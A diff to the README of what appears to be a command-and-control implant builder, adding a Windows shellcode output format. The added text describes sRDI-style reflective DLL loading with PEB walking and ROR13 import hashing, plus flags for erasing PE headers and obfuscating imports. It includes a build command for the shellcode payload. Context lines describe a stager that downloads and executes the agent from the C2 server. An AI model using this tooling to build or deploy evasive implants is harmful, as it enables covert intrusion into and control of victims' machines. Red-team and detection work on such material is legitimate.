@@ -25,7 +25,7 @@ cargo run --bin builder -- \
 | `--port` | `4443` | C2 server port (or pipe name for named_pipe) |
 | `--platform` | `linux` | Target: `linux`, `windows`, `macos` |
 | `--transport` | `tls` | Transport: `tls`, `tcp_plain`, `named_pipe`, `http`, `https` |
-| `--format` | `exe` | Output: `exe`, `dll`, `service`, `stager` |
+| `--format` | `exe` | Output: `exe`, `dll`, `service`, `stager`, `shellcode` |
 | `--profile` | `default` | Built-in profile: `default`, `http_post`, `http_image` |
 | `--profile-file` | — | Path to custom malleable profile JSON |
 | `--fallback-file` | — | Path to fallback endpoints JSON |
@@ -85,6 +85,46 @@ sc start RCMAgent
 
 ### Stager
 Minimal downloader (~50KB). Fetches the full agent from `/stage/<build_id>` on the C2 server, writes to temp, executes, cleans up. Good for initial access where payload size matters.
+
+### Shellcode (.bin)
+Windows x64 only. Builds the agent DLL, then converts it into position-independent
+shellcode using sRDI-style reflective loading:
+
+```
+┌─────────────────────┬──────────────────┬─────────────┬───────────┐
+│ bootstrap (69 bytes)│ RDI loader stub  │ raw DLL     │ user data │
+└─────────────────────┴──────────────────┴─────────────┴───────────┘
+```
+
+At runtime the bootstrap captures RIP, passes the DLL pointer / export hash /
+user-data pointer / flags to the embedded loader stub, which maps the DLL in
+memory (section copy, base relocations, import resolution via PEB walk + ROR13
+hashing) and calls `DllMain(DLL_PROCESS_ATTACH)` — where the RCM agent spawns
+its thread. No export call is needed for RCM agents, hence the default hash
+`0x10` ("none").
+
+The conversion is byte-for-byte compatible with [sRDI](https://github.com/monoxgas/sRDI)
+(BSD 3-Clause, Copyright (c) 2013 Matthew Graeber); the embedded 64-bit loader
+stub is sRDI's precompiled `ShellcodeRDI` output. Execute the `.bin` with any
+shellcode loader (`VirtualAlloc` + `memcpy` + `CreateThread`, or your injector
+of choice — see `extensions/inject_*.rhai`).
+
+Shellcode-specific flags:
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--sc-hash` | `0x10` | ROR13 hash of a DLL export to call after load (hex or decimal). `0x10` = none |
+| `--sc-userdata` | `None` | Opaque blob appended after the DLL; pointer+length handed to the loader |
+| `--sc-flags` | `0` | Loader flags (bit0: erase PE headers after load, bit1: obfuscate imports) |
+| `--sc-output` | `bin` | File encoding: `bin` (raw), `b64`, `c` (C array), `hex` |
+
+```bash
+cargo run --bin builder -- \
+  --host 10.0.0.1 --port 4443 \
+  --platform windows --transport tls \
+  --format shellcode --sc-output bin
+# → dist/shellcode_windows_<id>.bin
+```
 
 ## Examples
 
